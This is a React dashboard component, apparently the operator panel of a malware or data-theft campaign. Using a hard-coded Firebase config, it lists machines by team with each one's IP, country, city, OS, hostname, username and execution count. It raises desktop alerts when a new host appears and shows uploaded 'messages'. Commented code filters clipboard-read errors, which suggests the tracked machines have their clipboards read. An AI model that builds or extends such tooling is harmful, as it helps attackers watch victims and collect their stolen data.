import React, { useEffect, useState } from "react";
import { Link, Navigate } from "react-router-dom";
import { connect } from "react-redux";
import PropTypes from "prop-types";
import _ from "lodash";
import Select from "react-select";
import "./style.css";

const { initializeApp } = require("firebase/app");
const { getDatabase } = require("firebase/database");
const {
  ref,
  set,
  query,
  remove,
  onValue,
  orderByKey,
  orderByChild,
  equalTo,
  limitToLast,
  off,
} = require("firebase/database");

const basic = {
  apiKey: "AIzaSyC9oSaVpte4TnB5vtsYG2a7yS_Hl1rnaks",
  authDomain: "project-log-8a82b.firebaseapp.com",
  projectId: "project-log-8a82b",
  storageBucket: "project-log-8a82b.firebasestorage.app",
  messagingSenderId: "260104400247",
  appId: "1:260104400247:web:0e6601890de44d0eaec572",
  measurementId: "G-0YB0PMV2ZD",
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);
const customStyles = {
  control: (base) => ({
    ...base,
    backgroundColor: "#f0f0f0",
    borderColor: "#888",
    borderRadius: "10px",
    padding: "2px 5px",
    width: "300px",
  }),
  option: (base, state) => ({
    ...base,
    backgroundColor: state.isFocused ? "#ddd" : "#fff",
    color: "#000",
    padding: 10,
  }),
  singleValue: (base) => ({
    ...base,
    color: "#333",
    fontWeight: "bold",
  }),
};
const Landing = (props) => {
  const [data, setData] = useState([]);
  const [logs, setLogData] = useState([]);
  const [user, setUser] = useState({ team: "4" });
  const [selectedUser, setSelectedUser] = useState(null);
  const [selectedId, setID] = useState(null);
  const [selectedHost, setSelectedHost] = useState(null);
  const [options, setOptions] = useState([{ value: null, label: "All" }]);
  const [userIDs, setUserIDs] = useState([{ value: null, label: "All" }]);
  let teamhostRef = null;
  let teamProjectRef = null;
  let teamuserRef = null;
  let teamlogRef = null;
  let lastHost = null;
  const handleUserChange = (val) => {
    setSelectedHost(null);
    setID(null);
    if (val.value == null) {
      setSelectedUser(null);
      return;
    }
    setSelectedUser(val.value);
  };
  const handleChange = (val) => {
    if (val.value == null) {
      setID(null);
      setSelectedHost(null);
      return;
    }
    setID(val.value);
    setSelectedHost(val.label);
  };

  const setHost = () => {
    if (teamhostRef) off(teamhostRef);
    teamhostRef = ref(rtdb, user.team + "team-host");
    onValue(
      query(teamhostRef, orderByKey()),
      // teamhostRef,
      (snapshot) => {
        console.log(
          selectedUser
            ? _.filter(snapshot.val(), { id: selectedUser })
            : snapshot.val()
        );
        setUserIDs([
          { value: null, label: "All" },
          ..._.map(_.uniq(_.map(snapshot.val(), "id")), (item) => ({
            label: item,
            value: item,
          })).reverse(),
        ]);
        setOptions([
          { value: null, label: "All" },
          ..._.uniqBy(
            _.map(
              selectedUser
                ? _.filter(snapshot.val(), { id: selectedUser })
                : snapshot.val(),
              (item) => ({
                label: item.id + "_" + item.host,
                value: item.pid,
              })
            ).reverse(),
            "value"
          ),
        ]);
      },
      {
        // onlyOnce: true,
      }
    );
  };
  const setProject = () => {
    if (teamProjectRef) off(teamProjectRef);
    teamProjectRef = ref(rtdb, user.team + "team-project");
    const projectQuery =
      selectedHost == null
        ? query(
            teamProjectRef,
            orderByKey(),
            // orderByChild("t"),
            // equalTo(user.team),
            limitToLast(500)
          )
        : query(teamProjectRef, orderByChild("pid"), equalTo(selectedId));

    console.log("Project function call");
    onValue(
      projectQuery,
      // teamProjectRef,
      (snapshot) => {
        console.log("snapshot => ", snapshot.val());
        let tmp = [];
        let executionTimes = {};
        let callTimes = {};
        snapshot.forEach((childSnapshot, key) => {
          const childKey = childSnapshot.key;
          let childData = childSnapshot.val();
          childData.key = childKey;
          if (childData.t != user.team) return;
          if (selectedUser && selectedUser != childData.id) return;
          // if (
          //   childData.message == "Command failed with exit code 1: pbpaste" ||
          //   childData.message == "Both xsel and fallback failed" ||
          //   childData.message.indexOf(
          //     "node_modules\\clipboardy\\fallbacks\\windows\\clipboard_x86_64.exe --paste"
          //   ) > -1
          // ) {
          //   remove(ref(rtdb, "project/" + childKey));
          // }
          if (!user) return;
          if (childData.country) {
            if (callTimes[childData.ip]) {
              callTimes[childData.ip]++;
              childData.exeCnt = callTimes[childData.ip];
            } else {
              callTimes[childData.ip] = 1;
              childData.exeCnt = 1;
            }
          }
          if (childData.os) {
            if (executionTimes[childData.ip]) {
              executionTimes[childData.ip]++;
              childData.exeCnt = executionTimes[childData.ip];
            } else {
              executionTimes[childData.ip] = 1;
              childData.exeCnt = 1;
            }
          }
          tmp.push({ ...childData });
          // ...
        });
        setData(tmp);
        console.log("te,p", lastHost, tmp[tmp.length - 1]);
        if (
          lastHost != null &&
          tmp[tmp.length - 1].country &&
          tmp[tmp.length - 1].key != lastHost
        ) {
          if (
            !selectedUser ||
            (selectedUser && selectedUser == tmp[tmp.length - 1].id)
          )
            if (
              !selectedHost ||
              (selectedHost && selectedHost == tmp[tmp.length - 1].pid)
            ) {
              if (tmp[tmp.length - 1].country) {
                new Notification(
                  tmp[tmp.length - 1].t + " - " + tmp[tmp.length - 1].id,
                  {
                    body:
                      tmp[tmp.length - 1].country +
                      "\n" +
                      tmp[tmp.length - 1].city +
                      "\n" +
                      tmp[tmp.length - 1].ip,
                  }
                );
              }
            }
        }
        if (tmp.length > 0) {
          console.log(tmp.length > 0, tmp[tmp.length - 1].key);
          lastHost = tmp[tmp.length - 1].key;
        }
        setTimeout(function () {
          // document.getElementById("upload_log").scrollTo({
          //   top: document.getElementById("upload_log").scrollHeight,
          // });
          document.getElementById("execute_log").scrollTo({
            top: document.getElementById("execute_log").scrollHeight,
          });
        }, 100);
      },
      {
        // onlyOnce: true,
      }
    );
  };
  const setLog = () => {
    if (teamlogRef) off(teamlogRef);
    teamlogRef = ref(rtdb, user.team + "team-log");
    const logQuery =
      selectedId == null
        ? query(
            teamlogRef,
            orderByKey(),
            // orderByChild("t"),
            // equalTo(user.team),
            limitToLast(500)
          )
        : query(teamlogRef, orderByChild("pid"), equalTo(selectedId));
    onValue(
      logQuery,
      // teamlogRef,
      (snapshot) => {
        console.log(snapshot.val());
        let tmp = [];
        let executionTimes = {};
        let callTimes = {};
        snapshot.forEach((childSnapshot, key) => {
          const childKey = childSnapshot.key;
          let childData = childSnapshot.val();
          childData.key = childKey;
          if (childData.t != user.team) return;
          if (selectedUser && selectedUser != childData.id) return;
          // if (
          //   childData.message == "Command failed with exit code 1: pbpaste" ||
          //   childData.message == "Both xsel and fallback failed" ||
          //   childData.message.indexOf(
          //     "node_modules\\clipboardy\\fallbacks\\windows\\clipboard_x86_64.exe --paste"
          //   ) > -1
          // ) {
          //   remove(ref(rtdb, "project/" + childKey));
          // }
          if (childData.country) {
            if (callTimes[childData.ip]) {
              callTimes[childData.ip]++;
              childData.exeCnt = callTimes[childData.ip];
            } else {
              callTimes[childData.ip] = 1;
              childData.exeCnt = 1;
            }
          }
          if (childData.os) {
            if (executionTimes[childData.ip]) {
              executionTimes[childData.ip]++;
              childData.exeCnt = executionTimes[childData.ip];
            } else {
              executionTimes[childData.ip] = 1;
              childData.exeCnt = 1;
            }
          }
          tmp.push({ ...childData });
          // ...
        });
        setLogData(_.sortBy(tmp, "key"));
        setTimeout(function () {
          // document.getElementById("upload_log").scrollTo({
          //   top: document.getElementById("upload_log").scrollHeight,
          // });
          document.getElementById("execute_log").scrollTo({
            top: document.getElementById("execute_log").scrollHeight,
          });
        }, 100);
      },
      {
        // onlyOnce: true,
      }
    );
  };

  useEffect(() => {
    // Fetching data
    if (user == null) return;
    setHost();
  }, [user]);
  useEffect(() => {
    // Fetching data
    if (user == null) return;
    setHost();
  }, [selectedUser]);
  useEffect(() => {
    // Fetching data
    if (user == null) return;
    setProject();
    if (user.role != "user") setLog();
    return () => {
      off(teamProjectRef);
      if (user.role != "user") off(teamlogRef);
    };
  }, [user, selectedId, selectedUser]);

  const tmpData = _.clone(data);
  console.log(selectedHost);
  return (
    <section
      className="landing"
      id="landing"
      style={{
        display: "flex",
        flexDirection: "column",
        justifyContent: "flex-start",
      }}
    >
      <div style={{ display: "flex", flexDirection: "row" }}>
        <Select
          options={userIDs}
          onChange={handleUserChange}
          styles={customStyles}
          // value={selectedUser}
          defaultValue={"All"}
          placeholder="Select User ID"
        />
        <Select
          options={options}
          onChange={handleChange}
          styles={customStyles}
          // value={selectedHost}
          defaultValue={selectedHost}
          placeholder="Select a host"
        />
      </div>
      <div
        style={{
          display: "flex",
          flexDirection: "row",
          justifyContent: "flex-start",
          paddingTop: "20px",
          height: "calc(100% - 90px)",
        }}
      >
        <div
          style={{
            display: "flex",
            flex: 1,
            flexDirection: "column",
            justifyContent: "flex-start",
            height: "100%",
            overflow: "auto",
          }}
          id="execute_log"
        >
          {_.map(tmpData, (item, key) => {
            return item.country ? (
              <div style={{ marginTop: "20px" }} key={key}>
                <div style={{ color: "#78f089" }}>
                  <span style={{ marginRight: "10px", color: "#fba2f7" }}>
                    {item.country}
                  </span>{" "}
                  <span style={{ marginRight: "10px" }}>{item.city}</span>
                  <span style={{ marginRight: "10px", color: "#fba2f7" }}>
                    {item.ip}
                  </span>{" "}
                  <span
                    style={{
                      marginRight: "10px",
                      color: "#f36538",
                      fontWeight: "bold",
                      fontSize: "1.2rem",
                    }}
                  >
                    {item.id}
                  </span>{" "}
                  <span style={{ marginRight: "10px" }}>
                    {item._date} {item._time}
                  </span>
                  <span style={{ color: "#00ff25", fontSize: "1.4rem" }}>
                    {"===========>"} {item.exeCnt}
                  </span>
                </div>
              </div>
            ) : (
              item.os && (
                <div
                  style={{ marginBottom: "20px" }}
                  className={
                    "pc-info" +
                    (selectedId == item.pid ? " pc-info-selected" : "")
                  }
                  onClick={() => {
                    console.log(selectedId, item.pid);
                    selectedId == item.pid ? setID(null) : setID(item.pid);
                  }}
                  key={key}
                >
                  <div>
                    -------------------{" "}
                    <span style={{ color: "#fba2f7" }}>{item.ip}</span>{" "}
                    {item._date} {item._time} -----------------------------
                  </div>
                  <div>
                    <span>OS: </span>
                    <span style={{ color: "yellow", marginRight: 20 }}>
                      {item.os}
                    </span>
                    <span>Release: </span>
                    <span style={{ color: "yellow", marginRight: 20 }}>
                      {item.release}
                    </span>

                    <span>Host: </span>
                    <span style={{ color: "yellow", marginRight: 20 }}>
                      {item.id + "_" + item.host}
                    </span>

                    <span>User Name: </span>
                    <span style={{ color: "yellow", marginRight: 20 }}>
                      {item.userName}
                    </span>
                    <span>CNT: </span>
                    <span style={{ color: "yellow", fontSize: "1.2rem" }}>
                      {item.exeCnt}
                    </span>
                  </div>
                  <div>
                    --------------------------------------------------------------------------------------------------------
                  </div>
                </div>
              )
            );
          })}
        </div>
        {user && user.role != "user" && (
          <div
            style={{
              display: "flex",
              flex: 1,
              flexDirection: "column",
              justifyContent: "flex-start",
              height: "100%",
              whiteSpace: "pre-wrap",
              overflow: "auto",
              width: "50%",
            }}
            id="upload_log"
          >
            {_.map(
              logs,
              (item, key) =>
                item.message && (
                  <div
                    style={{
                      wordBreak: "break-all",
                      marginBottom: "20px",
                      padding: "10px",
                    }}
                    key={"msg_" + key}
                  >
                    <h4 style={{ color: "#fba2f7", fontSize: "16px" }}>
                      {item.ip} Message({item.id}_{item.host}): {item._date}{" "}
                      {item._time}
                    </h4>
                    <div>{item.message}</div>
                  </div>
                )
            )}
          </div>
        )}
      </div>
    </section>
  );
};

Landing.propTypes = {
  isAuthenticated: PropTypes.bool,
};

const mapStateToProps = (state) => ({
  isAuthenticated: state.auth.isAuthenticated,
});

export default connect(mapStateToProps)(Landing);
